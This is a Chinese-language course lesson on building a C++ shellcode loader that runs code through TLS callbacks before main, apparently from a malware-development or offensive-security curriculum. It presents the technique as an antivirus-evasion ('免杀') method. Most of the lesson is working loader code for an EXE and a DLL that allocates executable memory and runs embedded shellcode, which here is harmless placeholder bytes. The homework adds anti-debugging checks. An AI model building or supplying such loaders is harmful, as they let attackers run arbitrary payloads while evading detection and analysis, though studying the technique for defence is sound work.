# 课时10 - C++ TLS实现ShellCode Loader

## 课程目标
1. 理解TLS（线程本地存储）回调机制
2. 掌握TLS回调的注册和执行时机
3. 实现TLS回调方式执行ShellCode
4. 了解TLS的免杀特性

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| TLS | Thread Local Storage | 线程本地存储 |
| TLS Callback | - | TLS回调函数，在线程启动前执行 |
| IMAGE_TLS_DIRECTORY | - | PE中的TLS目录结构 |
| DLL_PROCESS_ATTACH | - | 进程附加通知 |

## 代码实现

```cpp
// tls_loader.cpp
// TLS回调方式执行ShellCode
// 编译选项: 需要链接器支持TLS

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

// TLS回调函数
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        // 在main之前执行
        
        // 分配可执行内存
        LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (mem) {
            memcpy(mem, shellcode, sizeof(shellcode));
            
            // 执行ShellCode
            typedef int (*SC_FUNC)();
            SC_FUNC func = (SC_FUNC)mem;
            func();
            
            VirtualFree(mem, 0, MEM_RELEASE);
        }
    }
}

// 注册TLS回调
#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma const_seg()
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback_func")
#pragma data_seg(".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma data_seg()
#endif

// 另一种方式：使用数组
#ifdef _MSC_VER
#pragma section(".CRT$XLA", long, read)
#pragma section(".CRT$XLZ", long, read)

__declspec(allocate(".CRT$XLA")) PIMAGE_TLS_CALLBACK __xl_a = NULL;
__declspec(allocate(".CRT$XLZ")) PIMAGE_TLS_CALLBACK __xl_z = NULL;

extern "C" {
    // TLS目录
    #ifdef _WIN64
    extern ULONGLONG _tls_index;
    #else
    extern DWORD _tls_index;
    #endif
}
#endif

// 第二个TLS回调（可以注册多个）
void NTAPI TlsCallback2(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        // 另一个回调
        OutputDebugStringA("[TLS] Second callback executed\n");
    }
}

// 动态添加TLS回调（高级技术）
void AddTlsCallback(PIMAGE_TLS_CALLBACK callback) {
    // 需要修改PE头，较复杂
    // 通常在加壳器或Loader中使用
}

int main() {
    // TLS回调在此之前已经执行
    printf("========================================\n");
    printf("     TLS Callback Loader               \n");
    printf("========================================\n\n");
    
    printf("[*] Main function started\n");
    printf("[*] TLS callback should have executed before this\n");
    
    return 0;
}
```

### TLS DLL版本

```cpp
// tls_dll.cpp
// DLL中的TLS回调

#include <windows.h>

unsigned char shellcode[] = { 0x90, 0x90, 0xC3 };

void NTAPI TlsDllCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (mem) {
            memcpy(mem, shellcode, sizeof(shellcode));
            ((void(*)())mem)();
            VirtualFree(mem, 0, MEM_RELEASE);
        }
    }
}

#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_dll_callback")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_dll_callback = TlsDllCallback;
#pragma const_seg()
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_dll_callback")
#pragma data_seg(".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK tls_dll_callback = TlsDllCallback;
#pragma data_seg()
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    // DllMain在TLS回调之后执行
    return TRUE;
}
```

## 课后作业

### 作业1：多个TLS回调
实现注册多个TLS回调函数。

### 作业2：反调试TLS
在TLS回调中添加反调试检测。
